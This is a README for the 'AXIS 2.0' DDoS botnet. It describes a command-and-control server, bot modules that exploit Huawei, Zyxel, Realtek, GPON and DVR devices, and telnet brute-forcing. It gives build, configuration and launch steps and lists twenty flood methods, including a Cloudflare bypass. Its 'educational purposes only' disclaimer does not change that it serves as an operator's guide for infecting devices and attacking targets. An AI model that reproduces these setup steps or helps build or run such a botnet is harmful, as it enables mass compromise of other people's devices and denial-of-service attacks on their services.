# AXIS 2.0 Botnet - Source Code

**DDoS botnet framework source code - Requires compilation**

---

## ⚠️ NOTICE

This is **SOURCE CODE ONLY** - not a finished product. You must:
1. Install all dependencies (Go, GCC, cross-compilers, MySQL)
2. Configure all settings for your environment
3. Compile all components
4. Set up infrastructure (web server, TFTP, database)
5. Test thoroughly before any deployment

---

## 📋 Requirements

### Build Environment
- **OS**: Linux (Ubuntu/Debian/CentOS)
- **Go**: 1.13+ (for C&C server)
- **GCC**: With cross-compilation toolchains (for bot binaries)
- **MySQL/MariaDB**: Database server

### Infrastructure
- **Web Server**: Apache/Nginx (binary hosting)
- **TFTP Server**: tftpd-hpa (alternative download method)
- **Database**: MySQL/MariaDB (user management, logging)

---

## 🎯 Features

### Core Capabilities
- **9 Exploit Scanners** - Multiple infection vectors
- **Modern UI** - Cyan/white/yellow interface
- **Layer-Based Attacks** - L3/L4/L7/Special categorization
- **20 Unique Attack Methods** - Streamlined, non-duplicate methods
- **API Support** - REST API for remote control
- **Database System** - User management, logging, whitelisting
- **Encrypted Telnet** - TLS 1.2+ admin connections

### Scanner Improvements
- **Rate-Limited** - Prevents crashes and network saturation
- **Expanded IP Ranges** - More vulnerable targets
- **Connection Throttling** - 500ms delay between connections
- **Reduced Concurrent Connections** - 64 max (down from 256)

---

## 📁 Directory Structure

```
AXIS 2.0/
├── cnc/                    # Command & Control server (Go source)
│   ├── main.go            # Main server with TLS support
│   ├── admin.go           # Admin panel handler
│   ├── attack.go          # Attack parsing (20 methods)
│   ├── bot.go             # Bot connection handling
│   ├── clientList.go      # Bot management
│   ├── database.go        # MySQL integration
│   └── api.go             # REST API
├── bot/                    # Bot source (C source)
│   ├── main.c             # Main bot loop
│   ├── attack.c/h         # Attack implementations
│   ├── scanner.c/h        # Telnet brute-force (rate-limited)
│   ├── killer.c/h         # Anti-malware
│   ├── huawei.c/h         # Huawei exploit (rate-limited)
│   ├── zyxel.c/h          # Zyxel exploit
│   ├── thinkphp.c/h       # ThinkPHP exploit
│   ├── realtek.c/h        # Realtek exploit (rate-limited)
│   ├── gpon_scanner.c/h   # GPON exploit (ports 80 & 8080)
│   ├── telnetbypass.c/h   # Telnet auth bypass
│   ├── dvr.c/h            # DVR camera exploit
│   ├── zhone.c/h          # Zhone ONT/OLT
│   └── config.h           # Bot configuration (EDIT THIS)
├── loader/                 # Telnet loader (C source)
├── dlr/                    # Downloader (C source)
├── build.sh                # Build script
├── database.sql            # MySQL schema
├── README.md               # This file
├── QUICK_SETUP.txt         # Quick reference
└── TROUBLESHOOTING.txt     # Troubleshooting guide
```

---

## 🔨 Building

### 1. Install Dependencies

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y golang-go gcc mysql-server apache2 tftpd-hpa build-essential

# Cross-compilers (optional, for multi-arch bots)
sudo apt install -y \
    gcc-arm-linux-gnueabi \
    gcc-arm-linux-gnueabihf \
    gcc-mips-linux-gnu \
    gcc-mipsel-linux-gnu
```

### 2. Set Up Database

```bash
mysql -u root -p < database.sql
```

### 3. Configure

Edit `bot/config.h` with your server IP:
```c
#define CNC_ADDR "YOUR.SERVER.IP.HERE"
#define CNC_PORT 3778
```

### 4. Build All Components

```bash
chmod +x build.sh
./build.sh
```

---

## 🚀 Running

### Start Services

```bash
# Terminal 1: C&C Server
./cnc_server

# Terminal 2: Scan Listener
./scanListen

# Terminal 3: Loader (feed IPs via stdin)
./loader < list.txt
```

### Connect to Admin Panel

```bash
# Encrypted Telnet (TLS)
openssl s_client -connect YOUR_SERVER_IP:3777 -quiet

# Login with database credentials
```

---

## ⚔️ Attack Methods (Streamlined)

### UDP Floods (8 methods)
- `udp` - Standard UDP flood
- `udpplain` - Plain UDP flood
- `udphex` - HEX-encoded UDP
- `socket-raw` - Raw socket UDP
- `samp` - SAMP game UDP
- `ovhudp` - OVH UDP bypass
- `dns` - DNS water torture
- `vse` - Valve Source Engine flood

### TCP Floods (8 methods)
- `tcp` - Raw TCP flood
- `syn` - SYN flood
- `ack` - ACK flood
- `tcpfrag` - TCP fragment
- `tcpbypass` - TCP bypass
- `xmas` - XMAS TCP
- `greip` - GRE IP flood
- `mixed` - Mixed TCP+UDP

### Special (3 methods)
- `homeslam` - ICMP ping flood
- `udpbypass` - UDP bypass
- `greeth` - GRE Ethernet

### HTTP/HTTPS (3 methods)
- `http` - HTTP flood
- `https` - HTTPS flood
- `browserem` - Browser emulation

### Cloudflare (1 method)
- `cf` - Cloudflare bypass

**Total: 20 unique methods** (removed ~24 duplicates)

---

## 🔧 Scanner Optimizations

### Changes Made
1. **Reduced concurrent connections**: 256 → 64
2. **Reduced packet rate**: 384 PPS → 32 PPS
3. **Added connection delay**: 500ms between new connections
4. **Reduced timeouts**: Faster cleanup of dead connections

### Expanded IP Ranges
- Asia-Pacific: Full coverage
- Europe: All major ranges
- Americas: North + South America
- Middle East & Africa: Key regions

---

## ⚠️ Legal Disclaimer

**WARNING**: This software is provided for **EDUCATIONAL PURPOSES ONLY**.

- Only use on networks you **OWN** or have **EXPLICIT PERMISSION** to test
- Unauthorized use is **ILLEGAL**
- The authors are **NOT RESPONSIBLE** for misuse
- Compliance with all applicable laws is **YOUR RESPONSIBILITY**

---

## 📚 Documentation

- **README.md** - This file (overview)
- **QUICK_SETUP.txt** - Quick reference
- **TROUBLESHOOTING.txt** - Troubleshooting guide
- **ENCRYPTED_TELNET_GUIDE.md** - TLS telnet setup (if included)

---

## 👥 Credits

**Developed by AXIS Group**

---

## 📜 License

**Educational use only. All rights reserved.**

By using this software, you agree to:
- Use only for educational purposes
- Comply with all applicable laws
- Not use for unauthorized attacks
- Take full responsibility for your actions

---

**AXIS 2.0 - Source Code Release**
